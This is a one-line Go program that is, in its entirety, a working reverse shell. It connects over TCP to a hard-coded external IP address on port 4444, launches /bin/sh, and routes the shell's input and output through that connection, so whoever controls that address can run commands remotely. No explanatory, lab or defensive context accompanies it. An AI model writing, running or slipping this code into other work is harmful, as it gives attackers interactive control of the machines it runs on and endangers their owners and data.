package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","159.69.94.71:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
